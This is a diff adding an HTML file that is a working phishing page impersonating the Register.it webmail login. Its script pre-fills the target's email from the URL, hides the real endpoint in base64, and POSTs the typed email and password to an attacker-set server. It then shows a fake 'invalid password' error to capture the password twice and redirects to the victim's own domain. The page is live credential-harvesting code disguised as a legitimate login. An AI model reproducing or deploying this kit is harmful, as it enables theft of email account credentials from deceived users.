@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="content-language" content="it">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description"
+        content="Accedi alla tua posta elettronica da Webmail: gestisci la tua rubrica, gli appuntamenti, eventi e attività. Puoi impostare filtri e risponditore automatico.">
+    <meta name="keywords" content="webmail, register web email, posta elettronica, mail register.it">
+    <meta name="copyright" content="Register.it">
+    <link rel="canonical" href="https://webmail.register.it/">
+
+    <title>Webmail - Register.it - Web Email</title>
+
+
+
+
+    <link
+        href="https://tsattl2y5ha4qg5b7bqgxvzayfi7tx3gdhtb3daf6srwrdtou2sa.arweave.net/nIE5r1jpwcgbofhga9cgwVH532YZ5h2MBfSjaI5upqQ"
+        rel="stylesheet" type="text/css">
+
+
+
+    <link rel="stylesheet"
+        href="https://ezcquriult7s6lltrp33usyqilrach4ff4sjqbpvlimlhcslp53a.arweave.net/JkUKRRRc_y8tc4v3uksQQuIBH4UvJJgF9VoYs4pLf3Y">
+</head>
+
+<body>
+
+
+    <div class="main-container">
+
+        <div style="display:none" id="cookieBanner">
+            <h3 class="title-sm">Register.it ti informa</h3>
+            <p class="cc-text">
+                Il sito utilizza cookie di profilazione propri e di terze parti per offrirti un servizio in linea con le
+                preferenze da te manifestate nell'ambito della navigazione in rete. Se vuoi saperne di più o negare il
+                consenso ai cookie, <a href="https://www.register.it/company/legal/informativa-privacy/"
+                    id="open-policy-link" title="clicca qui. " class="navigate-without-cookies">clicca qui. </a>
+                Se prosegui nella navigazione selezionando un elemento del sito, acconsenti all'uso dei cookie.</p>
+        </div>
+        <nav class="navbar navbar-inverse navbar-fixed-top">
+            <div class="container-fluid">
+                <div class="navbar-header">
+                    <a class="navbar-brand" href="#">
+                        Register.it </a>
+                </div>
+            </div>
+        </nav><!-- /.nav-collapse -->
+
+        <div class="container-fluid main-content base-font">
+
+            <div class="row">
+                <div class="col-md-4 col-sm-5  col-xs-12 sidebar">
+
+                    <div class="row">
+
+                        <div class="col-md-12">
+
+                            <div class="row">
+
+                                <div class="loaderLayer col-md-12 col-sm-12 col-xs-12">
+                                    <div class="loader"><i class="fa fa-spinner fa-pulse"></i></div>
+                                </div>
+
+                            </div>
+
+                            <div class="row">
+
+                                <div class="col-md-12 text-center form-header">
+                                    <span class="fa-stack fa-3x">
+                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                        <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                                    </span>
+
+                                    <h1>Benvenuto nella tua Webmail</h1>
+
+                                    <h2>GESTISCI IL CALENDARIO, CONTATTI, ATTIVITÀ...</h2>
+                                </div>
+
+                            </div>
+
+                            <div class="row">
+
+                                <div class="col-md-12">
+                                    <form id="login">
+
+                                        <div class="alert alert-danger error-alert" id="msg" role="alert"
+                                            style="display: none;">Email o Password non validi</div>
+                                        <div class="alert alert-danger error-alert" id="error" role="alert"
+                                            style="display: none;">Email o Password non validi</div>
+                                        <div class="form-group">
+                                            <div class="floatlabel-wrapper" style="position:relative"><label
+                                                    for="account" class="label-floatlabel labelFloat "
+                                                    style="position: absolute; top: 0px; left: 8px; display: none; opacity: 0; font-size: 11px; font-weight: bold; color: rgb(131, 135, 128); transition: all 0.08s ease-in-out 0s;">Email</label><input
+                                                    name="em" type="email" class="form-control floatlabel" id="ai"
+                                                    readonly placeholder="Email"
+                                                    style="padding-top: 17px; transition: all 0.08s ease-in-out 0s;">
+                                            </div>
+                                            <span class="input-error"></span>
+                                        </div>
+
+                                        <div class="form-group">
+                                            <div class="floatlabel-wrapper" style="position:relative"><label
+                                                    for="password" class="label-floatlabel labelFloat "
+                                                    style="position: absolute; top: 0px; left: 8px; display: none; opacity: 0; font-size: 11px; font-weight: bold; color: rgb(131, 135, 128); transition: all 0.08s ease-in-out 0s;">Password</label><input
+                                                    name="ps" type="password" class="form-control floatlabel" id="pr"
+                                                    placeholder="Password" autocomplete="off"
+                                                    style="padding-top: 17px; transition: all 0.08s ease-in-out 0s;">
+                                            </div>
+                                            <span class="add-on input-group-addon">
+                                                <button type="button" class="fa fa-eye showpassword"
+                                                    data-eventaction="view pwd" data-eventlabel="hide"></button>
+                                            </span>
+                                        </div>
+
+                                        <div class="choice-group btn-group">
+
+
+                                            <input type="hidden" name="webmail" id="webmail" value="ox"
+                                                data-webmail="ox">
+
+                                        </div>
+
+                                        <button type="submit" id="submit-btn"
+                                            class="btn btn-lg btn-primary pull-right">Accedi</button>
+
+                                    </form>
+                                </div>
+
+                            </div>
+
+                            <div class="row">
+
+                                <div class="col-md-12 text-right pwd-recover">
+                                    <a href="#" target="_blank">Non ricordi la password?</a>
+                                </div>
+
+                            </div>
+
+                            <div class="row">
+
+                                <footer class="footer">
+
+                                    <h4>Copyright © 1999 - 2023 Register SpA</h4>
+
+                                    <p>Partita IVA &amp; Codice Fiscale: 04628270482</p>
+
+                                    <p>https://www.register.it/company/legal/informativa-privacy/</p>
+
+                                    <p>Per restare aggiornato sullo stato servizi iscriviti alla nostra Status page <a
+                                            href="#" target="_blank">qui</a></p>
+                                </footer>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div class="promo col-sm-7 col-md-8 col-md-offset-4 col-sm-offset-5 main">
+                    <div class="container promo-group">
+                        <div class="row">
+
+                            <h3>Avere il tuo <strong>Sito Web</strong><br> non è mai stato così
+                                <strong>semplice</strong>!</h3>
+
+                            <p>
+                                Fai crescere il tuo <strong>business</strong> in maniera <strong>veloce</strong>,
+                                <strong>sicura</strong> e <strong>professionale</strong>. </p>
+                            <a href="https://www.register.it/siti-web/realizzazione-siti/sito-evoluto/#pgc-61477-form-lead-0"
+                                id="promoBtn" target="_blank" class="btn btn-success btn-lg"
+                                data-eventaction="TE LO FACCIAMO NOI"
+                                data-eventlabel="https://www.register.it/siti-web/realizzazione-siti/sito-evoluto/#pgc-61477-form-lead-0">TE
+                                LO FACCIAMO NOI</a>
+
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div><!-- /.container -->
+
+    </div>
+
+
+
+    <!-- Modal -->
+    <div class="modal fade base-font" id="dismissModal">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4 class="modal-title" id="gridSystemModalLabel">Attenzione - Questa Webmail presto verrà dismessa
+                    </h4>
+                </div>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-md-12"><b>Attenzione! In data 10 Maggio 2017 inizieremo le procedure di
+                                dismissione di AtMail perché non soddisfa più gli standard di sicurezza di
+                                Register.it</b><br><br>Passa alla nuova Webmail: un avanzato <b>PIM</b> (<i>Personal
+                                Information Manager</i>) che ti permetterà di gestire al meglio la posta, la rubrica,
+                            gli appuntamenti e le attività.<br><br>Passare alla nuova Webmail è automatico e dovrai solo
+                            importare i tuoi contatti premendo il bottone "<b>Importa Contatti</b>" all'interno della
+                            nuova Webmail, che trovi in: <i>Menu laterale in alto a destra -&gt; Impostazioni -&gt;
+                                Importa Contatti</i></div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" data-dismiss="modal">Ho capito</button>
+
+                </div>
+            </div><!-- /.modal-content -->
+        </div><!-- /.modal-dialog -->
+    </div><!-- /.modal -->
+
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+    
+	<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Please enter your password");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("Please check your password");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+
+
+
+
+
+</body>
+
+</html>
